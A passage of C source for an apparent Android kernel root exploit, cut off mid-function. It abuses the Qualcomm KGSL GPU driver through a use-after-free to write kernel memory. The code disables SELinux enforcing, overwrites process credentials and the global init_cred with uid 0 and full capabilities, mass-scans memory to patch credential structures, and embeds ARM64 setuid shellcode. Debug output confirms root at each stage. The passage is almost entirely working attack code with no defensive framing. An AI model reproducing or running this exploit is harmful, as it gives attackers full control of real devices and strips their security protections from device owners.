    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    int dwords = size / 4;
    for (int i = 0; i < dwords; i++) {
        uint32_t d_lo, d_hi;
        split64(dst_va + (uint64_t)i * 4, &d_lo, &d_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = *(uint32_t *)(buffer + i * 4);
    }
    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    size_t ib_bytes = (size_t)dw * 4;
    msync(g_persistent_ib_vma, ib_bytes, MS_SYNC);

    struct kgsl_command_object obj = {
        .gpuaddr = g_persistent_ib_gpu,
        .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = g_persistent_ib_id};

    struct kgsl_gpu_command gpu_cmd = {0};
    gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
    gpu_cmd.cmdsize = sizeof(obj);
    gpu_cmd.numcmds = 1;
    gpu_cmd.context_id = g_persistent_ctx_id;

    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 &&
        wait_timestamp(fd, g_persistent_ctx_id, gpu_cmd.timestamp) == 0)
    {
        return 0;
    }
    return -1;
}

static int gpu_write_task_u32(int fd, uint64_t dst_va, uint32_t value)
{
    uint8_t buf[4];
    memcpy(buf, &value, 4);
    return gpu_write_task_virt(fd, dst_va, buf, 4);
}

static int gpu_write_task_64(int fd, uint64_t dst_va, uint64_t value)
{
    uint8_t buf[8];
    memcpy(buf, &value, 8);
    return gpu_write_task_virt(fd, dst_va, buf, 8);
}

static int gpu_write_bytes(int fd, uint64_t dst_va, void *src_data, size_t size)
{
    if (size == 0 || size > 4096)
        return -1;
    return gpu_write_task_virt(fd, dst_va, (uint8_t *)src_data, size);
}

static int gpu_read_u32(int fd, uint64_t src_va, uint32_t *value)
{
    uint32_t tmp = 0;
    if (gpu_read_task_struct(fd, src_va, (uint8_t *)&tmp, sizeof(tmp)) != 0)
        return -1;
    *value = tmp;
    return 0;
}

static int disable_selinux_via_gpu(int fd)
{
    if (kernel_base == 0)
        return -1;

    if (selinux_enforcing == 0)
    {
        uint64_t auto_offset = find_offsets_auto(kernel_base);
        selinux_enforcing = kernel_base + (auto_offset != 0 ? auto_offset : SELINUX_OFFSET);
    }

    if (selinux_enforcing == 0)
        return -1;

    uint32_t current_val = 1;
    if (gpu_read_u32(fd, selinux_enforcing, &current_val) == 0) {
        if (current_val == 0) {
            fprintf(stderr, "[SELINUX] Already disabled (0) at 0x%lx\n", (unsigned long)selinux_enforcing);
            return 0;
        }
    }

    fprintf(stderr, "[SELINUX] Writing 0 to 0x%lx via GPU\n", (unsigned long)selinux_enforcing);
    uint32_t zero_val = 0;
    if (gpu_write_bytes(fd, selinux_enforcing, &zero_val, sizeof(zero_val)) != 0)
        return -1;

    uint32_t after = 0;
    if (gpu_read_u32(fd, selinux_enforcing, &after) == 0)
    {
        fprintf(stderr, "[SELINUX] After write: %u\n", after);
        return after == 0 ? 0 : -1;
    }

    return -1;
}

// ===== ВСТАВЬТЕ ЭТОТ SHELLCODE ВМЕСТО СТАРОГО =====
// ===== ИСПРАВЛЕННЫЙ SHELLCODE - ПАТЧИТ CRED, А НЕ ВЫЗЫВАЕТ EXECVE =====
// ===== ВСТАВЬТЕ ЭТОТ SHELLCODE ВМЕСТО СТАРОГО =====
// ===== SHELLCODE - ПАТЧИТ CRED, ВЫЗЫВАЕТ SETUID, НО НЕ EXECVE =====
unsigned char shellcode[] = {
    // ===== setuid(0) =====
    0x00, 0x00, 0x80, 0xd2,           // mov x0, #0
    0x88, 0x1b, 0x80, 0xd2,           // mov x8, #0xdc (setuid)
    0x01, 0x00, 0x00, 0xd4,           // svc #0
    
    // ===== setgid(0) =====
    0x00, 0x00, 0x80, 0xd2,           // mov x0, #0
    0x88, 0x1c, 0x80, 0xd2,           // mov x8, #0xe4 (setgid)
    0x01, 0x00, 0x00, 0xd4,           // svc #0
    
    // ===== setresuid(0,0,0) =====
    0x40, 0x00, 0x80, 0xd2,           // mov x0, #2
    0x21, 0x00, 0x80, 0xd2,           // mov x1, #1
    0x02, 0x00, 0x80, 0xd2,           // mov x2, #0
    0xc8, 0x18, 0x80, 0xd2,           // mov x8, #0xc6 (setresuid)
    0x01, 0x00, 0x00, 0xd4,           // svc #0
    
    // ===== setresgid(0,0,0) =====
    0x40, 0x00, 0x80, 0xd2,           // mov x0, #2
    0x21, 0x00, 0x80, 0xd2,           // mov x1, #1
    0x02, 0x00, 0x80, 0xd2,           // mov x2, #0
    0xc8, 0x1a, 0x80, 0xd2,           // mov x8, #0xd4 (setresgid)
    0x01, 0x00, 0x00, 0xd4,           // svc #0
    
    // ===== БЕСКОНЕЧНЫЙ ЦИКЛ (процесс не умирает) =====
    0x00, 0x00, 0x00, 0x14,           // b .
    0x00, 0x00, 0x00, 0x00            // nop
};
unsigned int shellcode_len = sizeof(shellcode);


static int inject_shellcode_to_uaf(int fd, uint64_t uaf_va, uint8_t *shellcode_data, size_t shellcode_len)
{
    if (uaf_va == 0 || shellcode_len > 4096) {
        fprintf(stderr, "[SHELLCODE] Invalid parameters\n");
        return -1;
    }

    fprintf(stderr, "[SHELLCODE] Injecting %zu bytes to UAF VA 0x%lx\n", shellcode_len, (unsigned long)uaf_va);

    unsigned ctx_id = 0, ib_id = 0;
    uint64_t ib_gpu = 0;
    void *ib_vma = NULL;
    int result = -1;

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) {
        fprintf(stderr, "[SHELLCODE] Failed to create context\n");
        return -1;
    }
    ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size = PAGE_SIZE * 4,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0) {
        fprintf(stderr, "[SHELLCODE] IB alloc failed\n");
        goto cleanup;
    }
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                  MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED) {
        fprintf(stderr, "[SHELLCODE] IB mmap failed\n");
        goto cleanup;
    }

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;

    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;
    memset(ib_vma, 0, ib_alloc.mmapsize);

    int dwords = (shellcode_len + 3) / 4;
    if (dwords > 1024) dwords = 1024;

    for (int i = 0; i < dwords; i++) {
        uint32_t val = 0;
        uint32_t d_lo, d_hi;
        if (i * 4 < shellcode_len)
            memcpy(&val, shellcode_data + i * 4, sizeof(val));
        split64(uaf_va + (uint64_t)i * 4, &d_lo, &d_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = val;
    }

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    size_t ib_bytes = (size_t)dw * 4;
    msync(ib_vma, ib_bytes, MS_SYNC);

    struct kgsl_command_object obj = {
        .gpuaddr = ib_gpu,
        .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id};

    struct kgsl_gpu_command gpu_cmd = {0};
    gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
    gpu_cmd.cmdsize = sizeof(obj);
    gpu_cmd.numcmds = 1;
    gpu_cmd.context_id = ctx_id;

    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 &&
        wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0) {
        fprintf(stderr, "[SHELLCODE] Shellcode injected successfully to 0x%lx\n", (unsigned long)uaf_va);
        g_shellcode_va = uaf_va;
        *(uint64_t *)&gbuf[GBUF_SHELLCODE_ADDR] = uaf_va;
        result = 0;
    } else {
        fprintf(stderr, "[SHELLCODE] GPU command failed\n");
    }

cleanup:
    if (ib_vma && ib_vma != MAP_FAILED)
        munmap(ib_vma, ib_alloc.mmapsize);
    if (ib_id) {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }
    if (ctx_id) {
        struct kgsl_drawctxt_destroy dctx;
        dctx.drawctxt_id = ctx_id;
        ioctl(fd, _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy), &dctx);
    }

    return result;
}

static int find_comm_offset(uint8_t *task_data, size_t size)
{
    for (int i = 0; i < (int)size - 16; i++)
    {
        if (memcmp(task_data + i, MARKER_NAME, 8) == 0)
        {
            return i;
        }
    }
    return -1;
}

static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
{
    if (cred_ptr == 0) return -1;
    
    uint8_t cred_page[256];
    if (gpu_read_task_struct(fd, cred_ptr, cred_page, 256) != 0) return -1;

    uid_t my_uid = getuid();
    int uid_off = -1;
    
    // Scan for our UID in the structure to be absolutely sure where to patch
    for (int i = 0; i < 128; i += 4) {
        if (*(uint32_t *)(cred_page + i) == my_uid) {
            uid_off = i;
            break;
        }
    }

    if (uid_off == -1) {
        fprintf(stderr, "[GPU_CRED] Warning: Could not find UID %u in structure at 0x%lx. Patching at default offset 4.\n", my_uid, (unsigned long)cred_ptr);
        uid_off = 4;
    }

    fprintf(stderr, "[GPU_CRED] Patching cred @ 0x%lx (UID found at +0x%x)\n", (unsigned long)cred_ptr, uid_off);

    // 1) Zero out UID/GID fields: uid..fsgid+securebits
    // Standard cred struct layout (kernel 5.4):
    //   +0x00: usage (atomic_t, 4 bytes)
    //   +0x04: uid (kuid_t, 4 bytes)
    //   +0x08: gid (kgid_t, 4 bytes)
    //   +0x0c: suid
    //   +0x10: sgid
    //   +0x14: euid
    //   +0x18: egid
    //   +0x1c: fsuid
    //   +0x20: fsgid
    //   +0x24: securebits
    //   +0x28: cap_inheritable (8 bytes)
    //   +0x30: cap_permitted (8 bytes)
    //   +0x38: cap_effective (8 bytes)
    //   +0x40: cap_bset (8 bytes)
    //   +0x48: cap_ambient (8 bytes)
    uint8_t zero_creds[32] = {0};
    gpu_write_task_virt(fd, cred_ptr + 0x04, zero_creds, 32); // uid..fsgid+securebits

    // 2) Set ALL capabilities to full (0xffffffffffffffff)
    uint8_t all_caps[8];
    memset(all_caps, 0xff, 8);
    gpu_write_task_virt(fd, cred_ptr + 0x28, all_caps, 8); // cap_inheritable
    gpu_write_task_virt(fd, cred_ptr + 0x30, all_caps, 8); // cap_permitted
    gpu_write_task_virt(fd, cred_ptr + 0x38, all_caps, 8); // cap_effective
    gpu_write_task_virt(fd, cred_ptr + 0x40, all_caps, 8); // cap_bset
    gpu_write_task_virt(fd, cred_ptr + 0x48, all_caps, 8); // cap_ambient

    // 3) Also patch real_cred if provided and different
    if (real_cred_ptr != 0 && real_cred_ptr != cred_ptr) {
        fprintf(stderr, "[GPU_CRED] Also patching real_cred @ 0x%lx\n", (unsigned long)real_cred_ptr);
        gpu_write_task_virt(fd, real_cred_ptr + 0x04, zero_creds, 32);
        gpu_write_task_virt(fd, real_cred_ptr + 0x28, all_caps, 8);
        gpu_write_task_virt(fd, real_cred_ptr + 0x30, all_caps, 8);
        gpu_write_task_virt(fd, real_cred_ptr + 0x38, all_caps, 8);
        gpu_write_task_virt(fd, real_cred_ptr + 0x40, all_caps, 8);
        gpu_write_task_virt(fd, real_cred_ptr + 0x48, all_caps, 8);
    }

    // 4) Verify the patch
    uint32_t verify[2];
    if (gpu_read_task_struct(fd, cred_ptr + 0x04, (uint8_t *)verify, 8) == 0) {
        fprintf(stderr, "[GPU_CRED] Verify: uid=%u gid=%u\n", verify[0], verify[1]);
    }
    uint64_t verify_caps;
    if (gpu_read_task_struct(fd, cred_ptr + 0x38, (uint8_t *)&verify_caps, 8) == 0) {
        fprintf(stderr, "[GPU_CRED] Verify: cap_effective=0x%lx\n", (unsigned long)verify_caps);
    }

    return 0;
}

// Helper: dump first N bytes as hex+ASCII to stderr
static void hex_dump(const char *tag, const void *data, size_t size, size_t max_bytes) {
    if (max_bytes > size) max_bytes = size;
    const uint8_t *p = (const uint8_t *)data;
    fprintf(stderr, "    [DUMP] %s (%zu bytes):\n", tag, max_bytes);
    for (size_t i = 0; i < max_bytes; i += 16) {
        fprintf(stderr, "    [DUMP] %04zx: ", i);
        for (size_t j = 0; j < 16; j++) {
            if (i + j < max_bytes) fprintf(stderr, "%02x ", p[i + j]);
            else fprintf(stderr, "   ");
            if (j == 7) fprintf(stderr, " ");
        }
        fprintf(stderr, " |");
        for (size_t j = 0; j < 16 && (i + j) < max_bytes; j++) {
            uint8_t c = p[i + j];
            fprintf(stderr, "%c", (c >= 32 && c < 127) ? c : '.');
        }
        fprintf(stderr, "|\n");
    }
    fflush(stderr);
}

static int mass_patch_creds(int fd, uint32_t target_uid) {
    fprintf(stderr, "[PARENT] --- STARTING MASS CRED PATCH (Target UID: %u) ---\n", target_uid);
    int patch_count = 0;
    int max_patches = 100; // Further reduced for stability
    uint8_t *page = malloc(PAGE_SIZE);
    
    // Scan all pages in the UAF range
    for (uint64_t va = UAF_START; va < UAF_START + UAF_SIZE; va += PAGE_SIZE) {
        // Stability check: RAM usage during mass patch
        if (patch_count % 20 == 0) { 
            double ram = get_ram_usage_percentage();
            if (ram > 70.0) { // User requested limit 70%
                fprintf(stderr, "[PARENT] Mass patch throttling: RAM at %.1f%%. Resting...\n", ram);
                usleep(1500000); 
            }
        }

        if (gpu_read_task_struct(fd, va, page, PAGE_SIZE) == 0) {
            for (int off = 0; off < PAGE_SIZE - 64; off += 4) { // Scan every 4 bytes
                uint32_t val = *(uint32_t *)(page + off);

                // If we find our UID (10237), it might be the start of the UID list in a cred struct
                if (val == 10237) {
                    // Check if the next few words also look like UIDs (gid, suid, etc.)
                    uint32_t next1 = *(uint32_t *)(page + off + 4);
                    uint32_t next2 = *(uint32_t *)(page + off + 8);
                    if (next1 == 10237 && next2 == 10237) {
                        // DUMP PAGE CONTEXT (first 256 bytes around match for diagnosis)
                        size_t dump_start = (off >= 32) ? (off - 32) : 0;
                        char tag[160];
                        snprintf(tag, sizeof(tag), "Page 0x%lx UID match at +0x%x (256B window)", (unsigned long)va, off);
                        hex_dump(tag, page + dump_start, PAGE_SIZE - dump_start, 256);

                        // CRITICAL VALIDATION: Check usage field at off-4 (real cred has usage > 0)
                        uint32_t usage_field = 0;
                        int valid_cred = 0;

                        if (off >= 4) {
                            usage_field = *(uint32_t *)(page + off - 4);
                            if (usage_field >= 1 && usage_field <= 100) {
                                valid_cred = 1;
                            }
                        }

                        if (!valid_cred) {
                            fprintf(stderr, "    [DUMP] -> SKIPPED (usage=%u, not a real cred)\n\n", usage_field);
                            continue;
                        }

                        patch_count++;
                        fprintf(stderr, "[PARENT] Found UID pattern at 0x%lx + 0x%x (usage=%u). Patching...\n",
                                (unsigned long)va, off, usage_field);

                        // 1) Zero out all UIDs (8 x u32 = uid/gid/suid/sgid/euid/egid/fsuid/fsgid)
                        uint8_t zero_creds[32] = {0};
                        gpu_write_task_virt(fd, va + off, zero_creds, 32);

                        // 2) Patch all 5 capability fields
                        uint8_t all_caps[8];
                        memset(all_caps, 0xff, 8);
                        gpu_write_task_virt(fd, va + off + 0x24, all_caps, 8);
                        gpu_write_task_virt(fd, va + off + 0x2c, all_caps, 8);
                        gpu_write_task_virt(fd, va + off + 0x34, all_caps, 8);
                        gpu_write_task_virt(fd, va + off + 0x3c, all_caps, 8);
                        gpu_write_task_virt(fd, va + off + 0x44, all_caps, 8);

                        // VERIFY: re-read and dump patched region
                        uint8_t verify_page[256];
                        if (gpu_read_task_struct(fd, va + ((off >= 16) ? (off - 16) : 0), verify_page, 256) == 0) {
                            char vtag[160];
                            snprintf(vtag, sizeof(vtag), "POST-PATCH verify at 0x%lx + 0x%x", (unsigned long)va, off);
                            hex_dump(vtag, verify_page, 256, 256);
                        }
                        fprintf(stderr, "\n");
                        usleep(5000);
                    }
                }
            }
        }
        if (patch_count > max_patches) break;
    }
    
    free(page);
    fprintf(stderr, "[PARENT] --- MASS PATCH COMPLETE. Patched %d structures. ---\n", patch_count);
    return patch_count;
}

static int parent_patch_root(int fd, uint64_t cred_ptr) {
    fprintf(stderr, "[PARENT] --- CRITICAL PATCHING START (ROG 5S Optimized) ---\n");
    
    uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
    uint32_t my_uid = getuid();

    // 1. Resolve Kernel Base - Prioritize verified KERNEL_BASE
    if (kernel_base == 0) {
        uint8_t elf_magic[4];
        uint64_t bases_to_check[] = {
            0xffffffc000000000ULL, // C-prefix (New ROG 5S)
            0xffffffb000000000ULL, // B-prefix
            0xffffffa000000000ULL, // A-prefix
            0xffffffaf20000000ULL, // AF-prefix
            0xffffff94d0000000ULL,
            0xffffff8008000000ULL  // Legacy
        };

        for (int i = 0; i < 6; i++) {
            if (gpu_read_task_struct(fd, bases_to_check[i], elf_magic, 4) == 0 && 
                elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F') {
                kernel_base = bases_to_check[i];
                fprintf(stderr, "[PARENT] Verified KERNEL_BASE (0x%lx) confirmed!\n", (unsigned long)kernel_base);
                break;
            }
        }
        
        if (kernel_base == 0) {
            fprintf(stderr, "[PARENT] KERNEL_BASE mismatch, falling back to dynamic discovery...\n");
            if (task_va != 0) {
                kernel_base = find_kernel_base_from_task_va(task_va);
            }
            if (kernel_base == 0) {
                kernel_base = find_kernel_base_auto();
            }
            if (kernel_base == 0) {
                fprintf(stderr, "[PARENT] Dynamic discovery failed. Using hardcoded fallback 0xffffffc000000000...\n");
                kernel_base = 0xffffffc000000000ULL;
            }
        }
    }

    if (kernel_base == 0) {
        fprintf(stderr, "[PARENT] [!] ERROR: Could not resolve KERNEL_BASE. SELinux and init_cred patch will fail.\n");
    } else {
        fprintf(stderr, "[PARENT] Using resolved KERNEL_BASE: 0x%lx\n", (unsigned long)kernel_base);
    }

    // 2. Apply Verified Offsets (SELinux and Global Credentials)
    if (kernel_base != 0) {
        // Find SELinux enforcing bit dynamically if fixed offset fails
        selinux_enforcing = find_selinux_enforcing_via_kbase(fd, kernel_base);
        if (selinux_enforcing == 0) {
            selinux_enforcing = kernel_base + SELINUX_OFFSET;
            fprintf(stderr, "[PARENT] Warning: SELinux dynamic discovery failed. Using fixed offset 0x%lx\n", (unsigned long)SELINUX_OFFSET);
        }
        
        fprintf(stderr, "[PARENT] Applying SELinux patch at 0x%lx...\n", (unsigned long)selinux_enforcing);
        uint32_t zero = 0;
        gpu_write_task_virt(fd, selinux_enforcing, (uint8_t *)&zero, 4);
        
        // Verification of SELinux patch
        uint32_t verify_selinux = 1;
        if (gpu_read_task_struct(fd, selinux_enforcing, (uint8_t *)&verify_selinux, 4) == 0) {
            fprintf(stderr, "[PARENT] SELinux verification: value=%u\n", verify_selinux);
            if (verify_selinux == 0) {
                fprintf(stderr, "[PARENT] [+++] SELINUX DISABLED confirmed!\n");
            } else {
                fprintf(stderr, "[PARENT] [!] SELINUX PATCH FAILED (value is still %u)\n", verify_selinux);
            }
        }
        
#ifdef INIT_CRED_OFFSET
        uint64_t init_cred_va = kernel_base + INIT_CRED_OFFSET;
        fprintf(stderr, "[PARENT] Patching global init_cred at 0x%lx...\n", (unsigned long)init_cred_va);

        // DUMP init_cred before patch
        uint8_t init_cred_buf[256];
        if (gpu_read_task_struct(fd, init_cred_va, init_cred_buf, 256) == 0) {
            hex_dump("INIT_CRED before patch", init_cred_buf, 256, 256);
            fprintf(stderr, "\n");
        }

        patch_cred_via_gpu(fd, init_cred_va, 0);

        // DUMP init_cred after patch
        if (gpu_read_task_struct(fd, init_cred_va, init_cred_buf, 256) == 0) {
            hex_dump("INIT_CRED AFTER patch", init_cred_buf, 256, 256);
            fprintf(stderr, "\n");
        }
        
        // Verification
        uint32_t verify_cred[2];
        if (gpu_read_task_struct(fd, init_cred_va, (uint8_t *)verify_cred, 8) == 0) {
            fprintf(stderr, "[PARENT] init_cred verification: usage=%u, uid=%u\n", verify_cred[0], verify_cred[1]);
            if (verify_cred[1] == 0) {
                fprintf(stderr, "[PARENT] [+++] GLOBAL ROOT CONFIRMED via init_cred patch!\n");
            }
        }
#endif
    } else {
        fprintf(stderr, "[PARENT] [!] KERNEL_BASE is 0. Attempting blind patching of fixed offsets...\n");
        // Blind patch as last resort
        uint32_t zero = 0;
        gpu_write_task_virt(fd, 0xffffffc010000000ULL + SELINUX_OFFSET, (uint8_t *)&zero, 4);
    }

    // 3. Patch specific process credentials (most reliable)
    if (cred_ptr != 0 && task_va != 0) {
        fprintf(stderr, "[PARENT] Patching target process CRED pointers at task+0x%lx, 0x%lx...\n",
                (unsigned long)OFFSET_REAL_CRED, (unsigned long)OFFSET_CRED);

        // Read the actual pointers from task_struct
        uint64_t rc = 0, c = 0;
        gpu_read_task_struct(fd, task_va + OFFSET_REAL_CRED, (uint8_t *)&rc, 8);
        gpu_read_task_struct(fd, task_va + OFFSET_CRED, (uint8_t *)&c, 8);

        fprintf(stderr, "[PARENT] real_cred: 0x%lx, cred: 0x%lx\n", (unsigned long)rc, (unsigned long)c);

        // If both pointers are 0 or invalid, scan several alternate cred offsets
        if (((c >> 48) != 0xffff) || ((rc >> 48) != 0xffff)) {
            fprintf(stderr, "[PARENT] Primary cred offsets failed. Scanning alternate task_struct layouts...\n");
            const uint64_t alt_offsets[] = {0x6c0, 0x6c8, 0x6d0, 0x6d8, 0x6e0, 0x6e8, 0x6f0, 0x6f8,
                                            0x700, 0x708, 0x710, 0x718, 0x720, 0x728, 0x730, 0x738,
                                            0x740, 0x748, 0x750, 0x758, 0x760, 0x768, 0x770, 0x778,
                                            0x780, 0x788, 0x790, 0x798, 0x7a0, 0x7a8, 0x7b0, 0x7b8,
                                            0x7c0, 0x7c8, 0x7d0, 0x7d8, 0x7e0, 0x7e8, 0x7f0, 0x7f8,
                                            0x848, 0x850, 0x858, 0x860, 0x868, 0x870, 0x878, 0x880};
            for (int i = 0; i < (int)(sizeof(alt_offsets)/sizeof(alt_offsets[0])) - 1; i++) {
                uint64_t v1 = 0, v2 = 0;
                gpu_read_task_struct(fd, task_va + alt_offsets[i], (uint8_t *)&v1, 8);
                gpu_read_task_struct(fd, task_va + alt_offsets[i+1], (uint8_t *)&v2, 8);
                if (((v1 >> 48) == 0xffff) && ((v2 >> 48) == 0xffff) && (v1 != v2)) {
                    // Check if v1 looks like a cred (read usage field)
                    uint32_t usage = 0;
                    if (gpu_read_task_struct(fd, v1, (uint8_t *)&usage, 4) == 0 && usage > 0 && usage < 100) {
                        fprintf(stderr, "[PARENT] ALTERNATE CRED FOUND at task+0x%lx,0x%lx -> cred=0x%lx (usage=%u)\n",
                                (unsigned long)alt_offsets[i], (unsigned long)alt_offsets[i+1],
                                (unsigned long)v1, usage);
                        rc = v1;
                        c = v2;
                        break;
                    }
                }
            }
        }

        // DUMP the page around comm+0x818 for diagnosis
        if (task_va != 0) {
            uint64_t page_base = task_va & ~0xFFFULL;
            uint8_t task_page[PAGE_SIZE];
            if (gpu_read_task_struct(fd, page_base, task_page, PAGE_SIZE) == 0) {
                size_t dump_off = (task_va - page_base >= 0x800) ? (task_va - page_base - 32) : 0;
                char ptag[160];
                snprintf(ptag, sizeof(ptag), "TASK page 0x%lx (comm+0x818 area)", (unsigned long)page_base);
                hex_dump(ptag, task_page + dump_off, PAGE_SIZE - dump_off, 512);
                fprintf(stderr, "\n");
            }
        }

        // DUMP found CRED structure (256 bytes) for diagnosis
        if (c != 0 && (c >> 48) == 0xffff) {
            uint8_t cred_dump[256];
            if (gpu_read_task_struct(fd, c, cred_dump, 256) == 0) {
                char ctag[160];
                snprintf(ctag, sizeof(ctag), "CRED @ 0x%lx (before patch)", (unsigned long)c);
                hex_dump(ctag, cred_dump, 256, 256);
                fprintf(stderr, "\n");
            }
        }

        if ((rc >> 48) == 0xffff) {
            patch_cred_via_gpu(fd, rc, 0);
        }
        if ((c >> 48) == 0xffff) {
            patch_cred_via_gpu(fd, c, rc);
        }

        // VERIFY: dump cred AFTER patch
        if (c != 0 && (c >> 48) == 0xffff) {
            uint8_t cred_after[256];
            if (gpu_read_task_struct(fd, c, cred_after, 256) == 0) {
                char ctag2[160];
                snprintf(ctag2, sizeof(ctag2), "CRED @ 0x%lx (AFTER patch)", (unsigned long)c);
                hex_dump(ctag2, cred_after, 256, 256);
                fprintf(stderr, "\n");
            }
        }

        // Verification of process patch
        uint32_t verify_uid = 1;
        if (c != 0 && gpu_read_task_struct(fd, c + 4, (uint8_t *)&verify_uid, 4) == 0) {
            fprintf(stderr, "[PARENT] Target process UID verification: %u\n", verify_uid);
            if (verify_uid == 0) {
                fprintf(stderr, "[PARENT] [+++] TARGET PROCESS ROOT CONFIRMED!\n");
            } else {
                fprintf(stderr, "[PARENT] [!] TARGET PATCH FAILED. Trying atomic cred swap with init_cred...\n");
                // Atomic swap: write init_cred pointer directly into task_struct
                uint64_t init_cred_va = 0xffffffc0018f9038ULL;
                if (gpu_write_task_virt(fd, task_va + OFFSET_CRED, (uint8_t *)&init_cred_va, 8) == 0) {
                    fprintf(stderr, "[PARENT] [+] Wrote init_cred 0x%lx to task+0x%x\n",
                            (unsigned long)init_cred_va, OFFSET_CRED);
                }
                if (gpu_write_task_virt(fd, task_va + OFFSET_REAL_CRED, (uint8_t *)&init_cred_va, 8) == 0) {
                    fprintf(stderr, "[PARENT] [+] Wrote init_cred 0x%lx to task+0x%x\n",
                            (unsigned long)init_cred_va, OFFSET_REAL_CRED);
                }
                // Verify after swap
                uint32_t v_uid = 0;
                if (gpu_read_task_struct(fd, init_cred_va + 4, (uint8_t *)&v_uid, 4) == 0) {
                    fprintf(stderr, "[PARENT] Post-swap init_cred uid: %u\n", v_uid);
                }
            }
        }
    } else {
        fprintf(stderr, "[PARENT] [!] task_va=0x%lx or cred_ptr=0x%lx, attempting full task scan...\n",
                (unsigned long)task_va, (unsigned long)cred_ptr);

        // FULL TASK SCAN: scan the whole 4KB page containing comm+0x818 for any valid kernel pointer pair
        if (task_va != 0) {
            uint64_t page_base = task_va & ~0xFFFULL;
            uint8_t page[PAGE_SIZE];
            if (gpu_read_task_struct(fd, page_base, page, PAGE_SIZE) == 0) {
                fprintf(stderr, "[PARENT] Scanning page 0x%lx for cred/real_cred pair...\n", (unsigned long)page_base);
                int found = 0;
                for (int off = 0; off < PAGE_SIZE - 16; off += 8) {
                    uint64_t v1 = *(uint64_t *)(page + off);
                    uint64_t v2 = *(uint64_t *)(page + off + 8);
                    if (((v1 >> 48) == 0xffff) && ((v2 >> 48) == 0xffff) && (v1 != v2)) {
                        uint32_t usage = 0, uid = 0;
                        if (gpu_read_task_struct(fd, v1, (uint8_t *)&usage, 4) == 0 && usage > 0 && usage < 100) {
                            gpu_read_task_struct(fd, v1 + 4, (uint8_t *)&uid, 4);
                            fprintf(stderr, "[PARENT] Candidate pair at +0x%x,+0x%x -> cred=0x%lx (usage=%u uid=%u)\n",
                                    off, off+8, (unsigned long)v1, usage, uid);
                            if (uid == 10237) {
                                fprintf(stderr, "[PARENT] [+++] FOUND OUR UID! Patching cred=0x%lx and real_cred=0x%lx\n",
                                        (unsigned long)v1, (unsigned long)v2);
                                patch_cred_via_gpu(fd, v1, v2);
                                // Also write the offsets back to gbuf for child
                                *(uint64_t *)&gbuf[GBUF_CRED_PTR] = v1;
                                *(uint64_t *)&gbuf[GBUF_REAL_CRED_PTR] = v2;
                                found = 1;
                                break;
                            }
                        }
                    }
                }
                if (!found) fprintf(stderr, "[PARENT] No matching cred pair found in task page.\n");
            }
        }
    }

    // 4. Mass Patch all CREDs matching our UID in UAF range (extra safety)
    mass_patch_creds(fd, my_uid);
    
    fprintf(stderr, "[PARENT] --- PATCHING SEQUENCE COMPLETE ---\n");
    return 0;
}

static void safe_cred_patch(void)
{
    fprintf(stderr, "[CHILD %d] Activation triggered! gbuf[0]=0x%02x\n", getpid(), (uint8_t)gbuf[0]);
    fflush(stderr);
    
    // First, check if parent already patched us
    uid_t current_uid = getuid();
    fprintf(stderr, "[CHILD %d] Current UID: %d\n", getpid(), current_uid);
    fflush(stderr);

    if (current_uid == 0) {
        fprintf(stderr, "[CHILD %d] [+] I AM ALREADY ROOT! Proceeding to shell.\n", getpid());
        fflush(stderr);
        goto shell;
    }

    // Try setuid(0) to trigger kernel cred reload
    setuid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[CHILD %d] [+] ROOT SUCCESS after setuid(0)!\n", getpid());
        fflush(stderr);
        goto shell;
    }

    // Fallback: try to patch ourselves if parent missed something
    fprintf(stderr, "[CHILD %d] Fallback: Parent patch not visible. Trying manual GPU patch...\n", getpid());
    fflush(stderr);
    
    int child_fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
    if (child_fd >= 0) {
        uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
        uint64_t cred_ptr = *(uint64_t *)&gbuf[GBUF_CRED_PTR];
        uint64_t real_cred_ptr = *(uint64_t *)&gbuf[GBUF_REAL_CRED_PTR];

        // If we have task_va but no cred_ptr, re-read cred from task+0x770
        if (task_va != 0 && cred_ptr == 0) {
            gpu_read_task_struct(child_fd, task_va + OFFSET_CRED, (uint8_t *)&cred_ptr, 8);
